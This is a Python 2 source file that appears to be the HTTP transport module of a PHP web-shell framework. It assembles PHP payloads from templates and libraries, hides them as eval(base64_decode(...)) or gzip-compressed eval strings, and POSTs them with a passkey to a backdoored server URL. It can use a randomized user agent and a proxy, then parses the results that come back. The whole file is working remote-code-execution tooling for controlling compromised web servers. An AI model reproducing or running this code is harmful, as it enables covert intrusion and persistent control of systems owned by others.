import re, base64, urllib, urllib2
import framework.phpserialize
from functions import *

class Load:
    header   = dict()
    header['Accept']          = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    header['Accept-Language'] = 'fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3'
    header['Accept-Charset']  = 'ISO-8859-1,utf-8;q=0.7,*;q=0.7'

    parser   = '<%SEP%>%s</%SEP%>'

    template = getpath('framework/phpfiles/encapsulator.php').phpcode()


    def __init__(self, opener):
        self.target   = dict()
        self.proxy    = ''
        self.compress_request = False
        self.error    = False
        self.response       = None
        self.response_error = None
        self.phplib_error   = ''
        self.loaded_phplibs = list()

        userAgent = opener['USERAGENT']
        if userAgent == '%%RAND_UA%%':
            userAgent = getpath('misc/http/user_agents.lst').randline()
        self.setHeader('User-Agent', userAgent)

        self.url = opener['URL']
        self.passkey = opener['PASSKEY']

        http  = urllib2.HTTPHandler()
        https = urllib2.HTTPSHandler()
        if opener['PROXY']:
            proxy = urllib2.ProxyHandler({'http' : 'http://'+opener['PROXY']})
            self.opener = urllib2.build_opener(http, https, proxy)
        else:
            self.opener = urllib2.build_opener(http, https)

        self.parser = self.parser.replace('%SEP%', opener['HASH'])

    def read(self):
        return(self.response)


    def compress(self):
        self.compress_request = True


    def setHeader(self, name, value):
        self.header[name] = value


    def loadphplibs(self, phpcode):
        result = ''
        for line in phpcode.splitlines():
            compLine = line.replace(' ','')
            if not compLine.startswith('!import('):
                result+= line+'\n'
            else:
                libname = line[line.find('(')+1:line.find(')')]
                if line.count('(') != 1 or line.count(')') != 1 or not libname:
                    self.phplib_error+= P_err+'Payload error: Invalid php import: '+line.strip()+os.linesep
                    return('')
                if libname not in self.loaded_phplibs:
                    try:
                        lib = getpath('framework/phplibs/%s.php' % libname).phpcode()
                    except:
                        self.phplib_error+= P_err+'Payload error: Php lib not found: '+libname+os.linesep
                        return('')
                    result+= self.loadphplibs(lib)+'\n'
                    self.loaded_phplibs.append(libname)
        return(result)


    def encode(self, phpcode):

        #XXX
        debug('http/query/1-plugin', phpcode)

        phpcode = self.template.replace('%%PAYLOAD%%', phpcode)
        phpcode = self.loadphplibs(phpcode)

        #XXX
        debug('http/query/2-payload', phpcode)

        phpcode = '\n'.join([x.strip() for x in phpcode.splitlines() if x.strip()])

        #XXX
        debug('http/query/3-compressed', phpcode)

        initCode, stopCode = ['echo "%s";' % x for x in self.parser.split('%s')]
        payload = initCode+phpcode.rstrip(';')+';'+stopCode

        #XXX
        debug('http/query/4-withParser', payload)

        rawPayload = base64.b64encode(payload)
        if self.compress_request:
            gzVal = base64.b64encode(payload.encode('zlib'))
            gzPayload = 'eval(gzuncompress(base64_decode("%s")));' % gzVal
            gzRawPayload = base64.b64encode(gzPayload)
            if len(gzRawPayload) < len(rawPayload):
                rawPayload = gzRawPayload

        rawPayload = "eval(base64_decode('"+rawPayload+"'));"

        #XXX
        debug('http/query/5-zipped', rawPayload)

        post = urllib.urlencode({self.passkey : rawPayload})
        return(post)


    def Send(self, phpcode):
        post = self.encode(phpcode)
        if self.phplib_error:
            self.error = 'request'
            print self.phplib_error.strip()
        else:
            request = urllib2.Request(self.url, post, self.header)
            self.response = self.getResponse(request)


    def getResponse(self, request):
        result = ''
        try:
            result = self.opener.open(request).read()
        except urllib2.URLError, e:
            err = str(e)
            print err
            if err.startswith('<urlopen error '):
                err = err[15:-1]
                if err.startswith('[Errno '):
                    err = err[err.find(']')+2:]
                err = 'Request error: '+err
            print P_err+err
            self.error = 'request'
        except:
            try: sys.stdout.flush
            except: pass
            print '\r'+P_err+"HTTP Request interrupted"
            self.error = 'request'

        regexp = re.compile(self.parser % '(.+?)', re.S)

        #XXX
        debug('http/response/1-http', result)

        try:
            result = re.findall(regexp, result)[0]
        except:
            if not self.error:
                self.error = 'execution'
            return(None)

        if not result: return('')

        #XXX
        debug('http/response/2-response', result)

        try: result = result.decode('zlib')
        except: pass

        #XXX
        debug('http/response/3-unziped', result)

        try: result = framework.phpserialize.loads(result)
        except: result = self.getPhpErrs(result)

        #XXX
        debug('http/response/4-unserisalized', result)

        if type(result).__name__ != 'dict': return(None)
        if result.keys() == ['__RESULT__']:
            result = result['__RESULT__']
        elif result.keys() == ['__ERROR__']:
            self.response_error = result['__ERROR__']
            return(None)
        return(result)

    def getPhpErrs(self,data):
        data2 = data.replace('<br />','\n')
        data2 = [x.strip() for x in data2.split('\n') if x.strip()]
        errsNum = 0
        for x in data2:
            if x.count(': ')>1 and ' on line ' in x:
                errsNum+=1
                x = re.sub(' \[<a.*?a>\]','',x)
                x = re.sub('<.*?>','',x)
                x = x.replace(':  ',': ')
                x = ' in '.join(x.split(' in ')[0:-1])
                print P_err+'PHP Error: '+x
        if errsNum > 0:
            self.error = 'php'
            return('')
        return(data)
